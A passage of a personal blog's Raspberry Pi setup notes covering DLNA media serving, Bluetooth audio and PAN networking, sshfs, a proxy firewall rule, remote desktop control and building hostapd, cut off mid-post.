    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="Install-minidlna-by-sudo-apt-get-install-minidlna"><a href="#Install-minidlna-by-sudo-apt-get-install-minidlna" class="headerlink" title="Install minidlna by sudo apt-get install minidlna"></a>Install minidlna by <code>sudo apt-get install minidlna</code></h1><p>Changes in &#x2F;etc&#x2F;minidlna.conf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">media_dir=/home/pi/minidlna</span><br><span class="line">db_dir=/var/lib/minidlna (allow minidlna to index files)</span><br></pre></td></tr></table></figure>
<p>Restart minidlna, </p>
<ol>
<li><code>sudo systemctl restart minidlna</code></li>
<li><code>sudo service minidlna start</code></li>
<li><code>sudo /etc/init.d/minidlna start</code></li>
<li><code>sudo service minidlna status -l</code></li>
<li><code>sudo systemctl status minidlna -l</code></li>
</ol>
<p><a target="_blank" rel="noopener" href="http://mkitby.com/2015/11/09/raspberry-pi-nas-upnp-dlna/">http://mkitby.com/2015/11/09/raspberry-pi-nas-upnp-dlna/</a><br><a target="_blank" rel="noopener" href="http://cheng-min-i-taiwan.blogspot.hk/2013/02/raspberry-pi-dlna.html">http://cheng-min-i-taiwan.blogspot.hk/2013/02/raspberry-pi-dlna.html</a></p>
<h1 id="Install-the-command-line-media-player-by-sudo-apt-get-install-omxplayer-then-play-the-music-from-ssh-command-line"><a href="#Install-the-command-line-media-player-by-sudo-apt-get-install-omxplayer-then-play-the-music-from-ssh-command-line" class="headerlink" title="Install the command line media player by sudo apt-get install omxplayer, then play the music from ssh command line."></a>Install the command line media player by <code>sudo apt-get install omxplayer</code>, then play the music from ssh command line.</h1><p>Control the playback via such app “OMX Remote” or “Raspicast” which can be download from google play.</p>
<p><a target="_blank" rel="noopener" href="https://codeyarns.com/2016/09/09/how-to-cast-to-raspberry-pi-using-raspicast/">https://codeyarns.com/2016/09/09/how-to-cast-to-raspberry-pi-using-raspicast/</a><br><a target="_blank" rel="noopener" href="https://codeyarns.com/2016/03/20/omxplayer/">https://codeyarns.com/2016/03/20/omxplayer/</a><br><a target="_blank" rel="noopener" href="https://codeyarns.com/2016/09/09/omx-remote/">https://codeyarns.com/2016/09/09/omx-remote/</a></p>
<h1 id="Connect-to-bluetooth-speaker"><a href="#Connect-to-bluetooth-speaker" class="headerlink" title="Connect to bluetooth speaker"></a>Connect to bluetooth speaker</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">hcitool dev</span><br><span class="line">hciconfig - show BD address of Pi</span><br><span class="line">hciconfig -a hci0</span><br><span class="line">rfkill unblock bluetooth or rfkill unblock all // If bluetoothctl cannot find any controller, the bluetooth device may be blocked. Try to unblock it using rfkill</span><br><span class="line">sudo bluetoothctl</span><br><span class="line"># scan on (find the BD address)</span><br><span class="line"># scan off</span><br><span class="line"># agent on</span><br><span class="line"># default-agent</span><br><span class="line"># pair A0:E4:53:20:77:79</span><br><span class="line"># trust A0:E4:53:20:77:79</span><br><span class="line"># connect A0:E4:53:20:77:79</span><br><span class="line"># list</span><br><span class="line"># devices</span><br><span class="line"># show</span><br><span class="line"># disconnect A0:E4:53:20:77:79</span><br></pre></td></tr></table></figure>

<h1 id="Play-music-with-the-bluetooth-speaker-Phillips-BT3000-using-A2DP-profile"><a href="#Play-music-with-the-bluetooth-speaker-Phillips-BT3000-using-A2DP-profile" class="headerlink" title="Play music with the bluetooth speaker(Phillips BT3000) using A2DP profile"></a>Play music with the bluetooth speaker(Phillips BT3000) using A2DP profile</h1><ol>
<li><p>Check if pulseaudio is running (Reference <a target="_blank" rel="noopener" href="https://wiki.archlinux.org/index.php/PulseAudio_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/PulseAudio_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a>)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep pulseaudio</span><br><span class="line">=&gt;</span><br><span class="line">/usr/bin/start-pulseaudio-X11</span><br><span class="line">pulseaudio --start</span><br><span class="line">(PulseAudio would run along with X11 desktop startup)</span><br></pre></td></tr></table></figure>
</li>
<li><p>List the sound cards <code>pacmd list-cards</code>. Test audio output of left and right channal <code>speaker-test -c 2</code></p>
</li>
<li><p>List the audio output <code>pacmd list-sinks</code> or <code>pactl list sinks short</code>. Check the default audio sink <code>aplay -L</code></p>
</li>
<li><p>List the audio input <code>pacmd list-sources</code> or <code>pactl list sources short</code></p>
</li>
<li><p>Set the Bluetooth speaker becomes default sink <code>pacmd set-default-sink 1</code> (index 1 is like bluez_sink.xx_xx_xx_xx_xx_xx)</p>
</li>
<li><p>Turn up the PulseAudio volume <code>pacmd set-sink-volume 0 65537</code> Or turn up the ALSA volume <code>amixer set Master 100%</code> or <code>amixer cset numid=3 100%</code><br>  Reference:<br>  <a target="_blank" rel="noopener" href="http://youness.net/raspberry-pi/bluetooth-headset-raspberry-pi">http://youness.net/raspberry-pi/bluetooth-headset-raspberry-pi</a><br>  <a target="_blank" rel="noopener" href="http://www.crazy-audio.com/2014/09/pulseaudio-on-the-raspbery-pi/">http://www.crazy-audio.com/2014/09/pulseaudio-on-the-raspbery-pi/</a></p>
</li>
<li><p>Show soundcard information <code>aplay -L</code> or <code>aplay -l</code>, play a music <code>aplay -v -V stereo HANA.mp3</code></p>
</li>
</ol>
<h1 id="Stream-music-to-RPi-from-mobile-phone-connecting-with-bluetooth-Optional-maybe-RPi-can-automatically-detect-the-audio-source-bluetooth-and-sink-3-5mm-audio-jack"><a href="#Stream-music-to-RPi-from-mobile-phone-connecting-with-bluetooth-Optional-maybe-RPi-can-automatically-detect-the-audio-source-bluetooth-and-sink-3-5mm-audio-jack" class="headerlink" title="Stream music to RPi from mobile phone connecting with bluetooth (Optional, maybe RPi can automatically detect the audio source (bluetooth) and sink(3.5mm audio jack)"></a>Stream music to RPi from mobile phone connecting with bluetooth (Optional, maybe RPi can automatically detect the audio source (bluetooth) and sink(3.5mm audio jack)</h1><p>  <code>pactl load-module module-loopback source=bluez_source.B8_C6_8E_52_E8_CA sink=alsa_output.platform-bcm2835_AUD0.0.analog-stereo</code><br>  Reference:<br>  <a target="_blank" rel="noopener" href="http://kmonkey711.blogspot.hk/2012/12/a2dp-audio-on-raspberry-pi.html">http://kmonkey711.blogspot.hk/2012/12/a2dp-audio-on-raspberry-pi.html</a><br>  <a target="_blank" rel="noopener" href="http://www.dreamincode.net/forums/blog/62/entry-4272-sound-on-an-arch-linux-arm-raspberry-pi/">http://www.dreamincode.net/forums/blog/62/entry-4272-sound-on-an-arch-linux-arm-raspberry-pi/</a></p>
<h1 id="Bluetooth-stack"><a href="#Bluetooth-stack" class="headerlink" title="Bluetooth stack"></a>Bluetooth stack</h1><p>  Controller stack<br>    HCI(Host Controller Interface)<br>  Protocol stack<br>    - L2CAP (Logical Link Control and Adaptation Protocol) -<br>    - SDP (Service Discovery protocol) - scan devices<br>    - RFCOMM (Radio frequency communication) -  on top of L2CAP, providing emulated RS-232 serial ports<br>    - BNEP (Bluetooth network encapsulation protocol) - on top of L2CAP, for personal area networking (PAN) profile<br>  Profiles<br>    - A2DP (Advanced Audio Distribution Profile) - for headset<br>    - DUN (Dial-up Networking Profile) - for accessing internet by dialing up on a modem<br>  <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/List_of_Bluetooth_protocols">https://en.wikipedia.org/wiki/List_of_Bluetooth_protocols</a><br>  <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/List_of_Bluetooth_profiles">https://en.wikipedia.org/wiki/List_of_Bluetooth_profiles</a></p>
<h1 id="Setup-PAN"><a href="#Setup-PAN" class="headerlink" title="Setup PAN"></a>Setup PAN</h1><ol>
<li><p>Install bridge-utils <code>sudo apt install bridge-utils</code></p>
</li>
<li><p>Install python-dbus <code>sudo apt install python-dbus</code></p>
</li>
<li><p>Download bt-pan script <code>wget https://raw.githubusercontent.com/mk-fg/fgtk/master/bt-pan</code></p>
</li>
<li><p>Setup bpen bridge</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sdptool add NAP # advertise NAP service, but found sdptool does not work in bluez 5</span><br><span class="line">brctl show bnep</span><br><span class="line">sudo brctl addbr bnep</span><br><span class="line">sudo brctl setfd bnep 0</span><br><span class="line">sudo brctl stp bnep off</span><br><span class="line">sudo ip addr add 192.168.12.3/24 dev bnep</span><br><span class="line">sudo ip link set bnep up</span><br></pre></td></tr></table></figure></li>
<li><p>Setup server via dbus</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dbus-send --system --dest=org.bluez --print-reply --type=method_call /org/bluez/hci0 org.bluez.NetworkServer1.Unregister string:&#x27;nap&#x27;</span><br><span class="line">dbus-send --system --dest=org.bluez --print-reply --type=method_call /org/bluez/hci0 org.bluez.NetworkServer1.Register string:&#x27;nap&#x27; string:&#x27;bnep&#x27;</span><br></pre></td></tr></table></figure>
<p>Reference</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">dbus-send --system --type=method_call --print-reply --dest=org.bluez /org/bluez org.freedesktop.DBus.Introspectable.Introspect</span><br><span class="line">dbus-send --system --dest=org.bluez --type=method_call --print-reply /org/bluez/hci0 org.freedesktop.DBus.Introspectable.Introspect</span><br><span class="line">dbus-send --system --type=method_call --print-reply=literal --dest=org.bluez /org/bluez/hci0 org.freedesktop.DBus.Properties.Set string:org.bluez.Adapter1 string:Powered variant:boolean:false</span><br><span class="line">dbus-send --system --type=method_call --print-reply --dest=org.bluez /org/bluez/hci0 org.freedesktop.DBus.Properties.Get string:org.bluez.Adapter1 string:Address</span><br><span class="line">dbus-send --system --type=method_call --print-reply --dest=org.freedesktop.DBus / org.freedesktop.DBus.ListNames</span><br><span class="line"></span><br><span class="line">//below script is from http://rrbluetoothx.blogspot.hk/2016/06/rr-bluetooth-list-dbus-services-buses.html</span><br><span class="line">dbus-send --system            \</span><br><span class="line">  --dest=org.freedesktop.DBus \</span><br><span class="line">  --type=method_call          \</span><br><span class="line">  --print-reply               \</span><br><span class="line">  /org/freedesktop/DBus       \</span><br><span class="line">  org.freedesktop.DBus.ListNames</span><br><span class="line"></span><br><span class="line">//below script is from https://gist.github.com/studiofuga/5262efb95968b02a365d</span><br><span class="line">* Making an adapter discoverable (check that rfkill is enabled, otherwise /org/bluez/hci0 will not be available)</span><br><span class="line">dbus-send --system --dest=org.bluez --print-reply /org/bluez/hci0 \</span><br><span class="line">  org.freedesktop.DBus.Properties.Set \</span><br><span class="line">  string:org.bluez.Adapter1 string:Discoverable variant:boolean:true</span><br><span class="line">  </span><br><span class="line">* Changing the discoverable timeout. Default is 180s.</span><br><span class="line"></span><br><span class="line">dbus-send --system --dest=org.bluez --print-reply /org/bluez/hci0 \</span><br><span class="line">  org.freedesktop.DBus.Properties.Set \</span><br><span class="line">  string:org.bluez.Adapter1 string:DiscoverableTimeout variant:uint32:0</span><br></pre></td></tr></table></figure>
<p>Or Run bt server <code>./bt-pan --debug server bnep</code></p>
</li>
<li><p>Run bt client <code>./bt-pan --debug client 00:11:67:55:8F:69</code><br><a target="_blank" rel="noopener" href="https://blind.guru/tag/bluetooth-pan.html">https://blind.guru/tag/bluetooth-pan.html</a><br><a target="_blank" rel="noopener" href="http://blog.fraggod.net/2015/03/28/bluetooth-pan-network-setup-with-bluez-5x.html">http://blog.fraggod.net/2015/03/28/bluetooth-pan-network-setup-with-bluez-5x.html</a> (provide the bt-pan script)<br><a target="_blank" rel="noopener" href="http://www.agouros.de/Elwood/Bluetooth.html">http://www.agouros.de/Elwood/Bluetooth.html</a><br><a target="_blank" rel="noopener" href="http://trac.gateworks.com/wiki/wireless/bluetooth">http://trac.gateworks.com/wiki/wireless/bluetooth</a> (very detail)<br><a target="_blank" rel="noopener" href="http://wiki.openmoko.org/wiki/Manually_using_Bluetooth#Bluetooth_networking_with_a_Linux_system_-_More_secure_way">http://wiki.openmoko.org/wiki/Manually_using_Bluetooth#Bluetooth_networking_with_a_Linux_system_-_More_secure_way</a></p>
</li>
</ol>
<h1 id="sshfs"><a href="#sshfs" class="headerlink" title="sshfs"></a>sshfs</h1><ol>
<li>Install sshfs <code>sudo apt-get install sshfs</code></li>
<li>Mount the directory by<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sshfs -o allow_other -o kernel_cache -o auto_cache -o reconnect \</span><br><span class="line">  -o compression=no -o cache_timeout=600 -o ServerAliveInterval=15 \</span><br><span class="line">  support@192.168.42.1:/tmp/song /home/pi/minidlna</span><br></pre></td></tr></table></figure></li>
<li>Refresh the list to load new songs from sshfs directory by <code>minidlnad -R</code></li>
<li>Reload minidlna service <code>sudo service minidlna force-reload</code></li>
<li>Unmount directory <code>fusermount -u ~/minidlna</code></li>
</ol>
<h1 id="tinyproxy-and-iptables"><a href="#tinyproxy-and-iptables" class="headerlink" title="tinyproxy and iptables"></a>tinyproxy and iptables</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install tinyproxy</span><br><span class="line">sudo service tinyproxy start</span><br></pre></td></tr></table></figure>

<p>After install tinyproxy in my chromebook, found RPi cannot connect to 8888 port of tinyproxy(<code>nc -l 8888</code> in chromebook and fail to connect by <code>nc 192.168.42.9 8888</code> in RPi), which is caused by iptables rule. Then add it,</p>
<ol>
<li>Save the rules <code>sudo iptables-save &gt; iptables.rules</code> </li>
<li>Add the rule for proxy working <code>sudo iptables -A INPUT -s 192.168.42.0/24 -i wlan0 -p tcp -dport 8888 -j ACCEPT</code></li>
<li>Restore the rules <code>sudo iptables-restore &lt; iptables.rules</code></li>
</ol>
<h1 id="mpg321-mpg123-speedtest-cli-just-mark-this-this-is-nothing"><a href="#mpg321-mpg123-speedtest-cli-just-mark-this-this-is-nothing" class="headerlink" title="mpg321, mpg123, speedtest-cli (just mark this, this is nothing)"></a>mpg321, mpg123, speedtest-cli (just mark this, this is nothing)</h1><h1 id="Check-the-release-or-other-useful-information"><a href="#Check-the-release-or-other-useful-information" class="headerlink" title="Check the release or other useful information"></a>Check the release or other useful information</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a</span><br><span class="line">vcgencmd version</span><br><span class="line"></span><br><span class="line">cat /etc/os-release</span><br><span class="line">cat /etc/rpi-issue</span><br><span class="line">cat /etc/debian_version</span><br><span class="line"></span><br><span class="line">cat /proc/cpuinfo</span><br><span class="line">cat /proc/meminfo</span><br><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>

<h1 id="Show-various-hardware-information-to-RPi"><a href="#Show-various-hardware-information-to-RPi" class="headerlink" title="Show various hardware information to RPi"></a>Show various hardware information to RPi</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vcgencmd commands</span><br><span class="line"></span><br><span class="line">vcgencmd measure_clock arm</span><br><span class="line">vcgencmd measure_clock core</span><br><span class="line"></span><br><span class="line">vcgencmd get_config int</span><br><span class="line"></span><br><span class="line">vcgencmd get_mem arm</span><br><span class="line">vcgencmd get_mem gpu</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Setup-Display-On-Rpi" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2017-01-16T09:22:55.000Z"><a href="/2017/01/16/Setup-Display-On-Rpi/">2017-01-16</a></time>
      
      
  
    <h1 class="title"><a href="/2017/01/16/Setup-Display-On-Rpi/">Setup Display On Rpi</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="Xorg-Display-Server"><a href="#Xorg-Display-Server" class="headerlink" title="Xorg Display Server"></a>Xorg Display Server</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install --no-install-recommends xserver-xorg</span><br><span class="line">sudo apt-get install --no-install-recommends xinit (for command *startx* to start the Xorg Display Server)</span><br></pre></td></tr></table></figure>

<h1 id="Desktop-Environment-and-Openbox-Window-Manager"><a href="#Desktop-Environment-and-Openbox-Window-Manager" class="headerlink" title="Desktop Environment and Openbox Window Manager"></a>Desktop Environment and Openbox Window Manager</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install lxde-core</span><br><span class="line">sudo apt-get install lxappearance (Optional, for changing the look of applications such as panels, icons, progress bars, cursors, and so on, give yourself more customization abilities)</span><br></pre></td></tr></table></figure>

<h1 id="Login-Manager"><a href="#Login-Manager" class="headerlink" title="Login Manager"></a>Login Manager</h1><p><code>sudo apt-get install lightdm</code><br> if no login manager was installed, then just login via the command line! At anytime, you can launch the Xorg Display Server by typing in:<br> <code>startx</code></p>
<h1 id="Ubuntu-lt-x3D-gt-RPi"><a href="#Ubuntu-lt-x3D-gt-RPi" class="headerlink" title="Ubuntu &lt;&#x3D;&gt; RPi"></a>Ubuntu &lt;&#x3D;&gt; RPi</h1><h2 id="tightvncserver"><a href="#tightvncserver" class="headerlink" title="tightvncserver"></a>tightvncserver</h2><p> Install tightvncserver <code>sudo apt-get install tightvncserver</code> (For RPi to install tightvncserver, it needs to install xfonts-base)<br> Fix gray screen when login to ubuntu 14.04. Update file &#x2F;.vnc&#x2F;xstartup as below</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">def</span><br><span class="line">export XKL_XMODMAP_DISABLE=1</span><br><span class="line">unset SESSION_MANAGER</span><br><span class="line">unset DBUS_SESSION_BUS_ADDRESS</span><br><span class="line"> </span><br><span class="line">gnome-panel &amp;</span><br><span class="line">gnome-settings-daemon &amp;</span><br><span class="line">metacity &amp;</span><br><span class="line">nautilus &amp;</span><br><span class="line">gnome-terminal &amp;</span><br></pre></td></tr></table></figure>
<ol>
<li>Start vnc server by <code>tightvncserver</code> or with more options <code>vncserver :0 -geometry 1920x1080 -depth 24</code><br>  tightvncserver &#x3D;&#x3D; vncserver</li>
<li>Stop vnc server by <code>tightvncserver -kill :1</code><br> 3 .Download tvnjviewer-2.8.3-bin-gnugpl and connect to vnc server by <code>java -jar tightvnc-jviewer.jar</code></li>
</ol>
<h2 id="x2x"><a href="#x2x" class="headerlink" title="x2x"></a>x2x</h2><p> On RPi</p>
<ol>
<li><code>sudo apt-get install x2x</code></li>
<li>make sure <code>X11Forwarding yes</code> in &#x2F;etc&#x2F;ssh&#x2F;sshd_config<br> On Workstation</li>
<li><code>ssh -X pi@192.168.42.100 x2x -west -to :0</code> (-west, -north, -south) (-to :X &lt;&#x3D; <code>echo $DISPLAY</code> on RPi)</li>
</ol>
<h2 id="Another-option-xdotool"><a href="#Another-option-xdotool" class="headerlink" title="Another option xdotool"></a>Another option xdotool</h2><p>  <code>DISPLAY=:0 xdotool getactivewindow key Down</code><br>  <code>DISPLAY=:0 xdotool getactivewindow type &#39;your text here&#39;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xdotool click 1` 按下滑鼠左鍵（左鍵：1、滾輪：2、右鍵：3、滾輪上/下：4/5）</span><br><span class="line">xdotool mousedown</span><br><span class="line">xdotool mouseup</span><br></pre></td></tr></table></figure>

<h2 id="Android-lt-x3D-gt-RPi"><a href="#Android-lt-x3D-gt-RPi" class="headerlink" title="Android &lt;&#x3D;&gt; RPi"></a>Android &lt;&#x3D;&gt; RPi</h2><ol>
<li><p>Install simplecomputerremote on RPi</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># wget http://philproctor.github.io/SimpleComputerRemote/downloads/simplecomputerremote_1.2_armhf.deb</span><br><span class="line"># sudo dpkg -i simplecomputerremote_1.2_armhf.deb</span><br><span class="line"># /opt/rekap/SimpleComputerRemote</span><br></pre></td></tr></table></figure></li>
<li><p>Configure simplecomputerremote to run after desktop environment startup</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /home/pi/.config/autostart (if the directory does not exist.)</span><br><span class="line">cd /home/pi/.config/autostart</span><br><span class="line">sudo nano SimpleComputerRemote.desktop</span><br></pre></td></tr></table></figure>
<p>  Add following line in SimpleComputerRemote.desktop file</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">name=SimpleComputerRemote</span><br><span class="line">GenericName=Remote Control</span><br><span class="line">Comment=Allow remote control using Simple Computer Remote</span><br><span class="line">Exec=/opt/rekap/SimpleComputerRemote</span><br><span class="line">Terminal=False</span><br><span class="line">Type=Application</span><br></pre></td></tr></table></figure>
</li>
<li><p>As the app no longer exists in Google Play, you should need to download the apk from other market and install com.rekap.remote.apk on Android. Open the app, go to “Settings &gt; Select Server” and you will see RPi on the list.</p>
</li>
</ol>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>Display<br><a target="_blank" rel="noopener" href="https://www.raspberrypi.org/forums/viewtopic.php?f=66&amp;t=133691">https://www.raspberrypi.org/forums/viewtopic.php?f=66&amp;t=133691</a></p>
<p>x2x<br><a target="_blank" rel="noopener" href="http://raspberrypi.stackexchange.com/questions/4253/forward-mouse-and-keyboard-input-to-x-session">http://raspberrypi.stackexchange.com/questions/4253/forward-mouse-and-keyboard-input-to-x-session</a><br><a target="_blank" rel="noopener" href="http://linuxcommando.blogspot.hk/2014/07/share-keyboard-and-mouse-on-two-x.html">http://linuxcommando.blogspot.hk/2014/07/share-keyboard-and-mouse-on-two-x.html</a><br><a target="_blank" rel="noopener" href="https://help.ubuntu.com/community/X2xHowto">https://help.ubuntu.com/community/X2xHowto</a><br><a target="_blank" rel="noopener" href="https://github.com/dottedmag/x2x">https://github.com/dottedmag/x2x</a></p>
<p>Simple Computer Remote<br><a target="_blank" rel="noopener" href="https://www.raspberrypi.org/forums/viewtopic.php?f=27&amp;t=40797">https://www.raspberrypi.org/forums/viewtopic.php?f=27&amp;t=40797</a><br><a target="_blank" rel="noopener" href="http://sanjosetech.blogspot.hk/2013/10/raspberry-pi-remote-control.html">http://sanjosetech.blogspot.hk/2013/10/raspberry-pi-remote-control.html</a><br><a target="_blank" rel="noopener" href="http://randomcompstuff.blogspot.hk/2014/07/how-to-install-simple-computer-remote.html">http://randomcompstuff.blogspot.hk/2014/07/how-to-install-simple-computer-remote.html</a><br><a target="_blank" rel="noopener" href="http://onkea.com/ubuntu-vnc-grey-screen/">Fix grey screen on connecting VNC server when setting up Ubuntu 14.04 with VNC</a><br><a target="_blank" rel="noopener" href="https://solenerotech1.wordpress.com/">quadcopter control by RPi</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Install-Hostapd-On-Rpi" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2017-01-13T09:22:55.000Z"><a href="/2017/01/13/Install-Hostapd-On-Rpi/">2017-01-13</a></time>
      
      
  
    <h1 class="title"><a href="/2017/01/13/Install-Hostapd-On-Rpi/">Install Hostapd On Rpi</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="List-all-enabled-services"><a href="#List-all-enabled-services" class="headerlink" title="List all enabled services."></a>List all enabled services.</h1><p><code>systemctl list-unit-files | grep enabled</code></p>
<h1 id="List-all-running-services"><a href="#List-all-running-services" class="headerlink" title="List all running services."></a>List all running services.</h1><p><code>systemctl | grep running</code></p>
<h1 id="Get-sshd-to-start-on-boot-as-it-is-disabled-by-default"><a href="#Get-sshd-to-start-on-boot-as-it-is-disabled-by-default" class="headerlink" title="Get sshd to start on boot as it is disabled by default"></a>Get sshd to start on boot as it is disabled by default</h1><p><code>sudo systemctl enable ssh.socket</code></p>
<h1 id="Get-dhcpd-to-stop-on-boot-as-it-need-more-time-to-boot"><a href="#Get-dhcpd-to-stop-on-boot-as-it-need-more-time-to-boot" class="headerlink" title="Get dhcpd to stop on boot as it need more time to boot"></a>Get dhcpd to stop on boot as it need more time to boot</h1><p><code>sudo systemctl disable dhcpcd.service</code></p>
<h1 id="Install-hostapd"><a href="#Install-hostapd" class="headerlink" title="Install hostapd"></a>Install hostapd</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/lostincynicism/hostapd-rtl8188</span><br><span class="line">sudo apt-get install libnl-3-dev # Fix fatal-error-netlink-genl-genl-h-no-such-file-or-directory</span><br><span class="line">sudo apt-get install libnl-genl-3-dev</span><br><span class="line">cd hostapd-rtl8188/hostapd &amp;&amp; sudo make all</span><br></pre></td></tr></table></figure>

<h1 id="Add-following-lines-to-x2F-boot-x2F-my-hostapd-sh-file"><a href="#Add-following-lines-to-x2F-boot-x2F-my-hostapd-sh-file" class="headerlink" title="Add following lines to &#x2F;boot&#x2F;my-hostapd.sh file"></a>Add following lines to &#x2F;boot&#x2F;my-hostapd.sh file</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh -</span><br><span class="line">#ifconfig wlan0 192.168.42.100 up</span><br><span class="line">#sleep 0.5</span><br><span class="line">#wpa_cli -i wlan0 terminate # Stop wpa_supplicant process</span><br><span class="line">#sleep 0.5</span><br><span class="line">/home/pi/hostapd-rtl8188/hostapd/hostapd /boot/hostadp.8188eu.conf</span><br></pre></td></tr></table></figure>

<h1 id="For-ip-configuration-it-is-more-applicable-to-update-etc-network-interfaces-file-but-for-Jessie-Debian-it-needs-to-disable-dhcpd-first-refering-to-http-raspberrypi-stackexchange-com-questions-37920-how-do-i-set-up-networking-wifi-static-ip-address-and-https-www-raspberrypi-org-documentation-hardware-raspberrypi-bootmodes-net-tutorial-md"><a href="#For-ip-configuration-it-is-more-applicable-to-update-etc-network-interfaces-file-but-for-Jessie-Debian-it-needs-to-disable-dhcpd-first-refering-to-http-raspberrypi-stackexchange-com-questions-37920-how-do-i-set-up-networking-wifi-static-ip-address-and-https-www-raspberrypi-org-documentation-hardware-raspberrypi-bootmodes-net-tutorial-md" class="headerlink" title="For ip configuration, it is more applicable to update /etc/network/interfaces file, but for Jessie Debian, it needs to disable dhcpd first refering to http://raspberrypi.stackexchange.com/questions/37920/how-do-i-set-up-networking-wifi-static-ip-address and https://www.raspberrypi.org/documentation/hardware/raspberrypi/bootmodes/net_tutorial.md"></a>For ip configuration, it is more applicable to update <code>/etc/network/interfaces</code> file, but for Jessie Debian, it needs to disable dhcpd first refering to <a 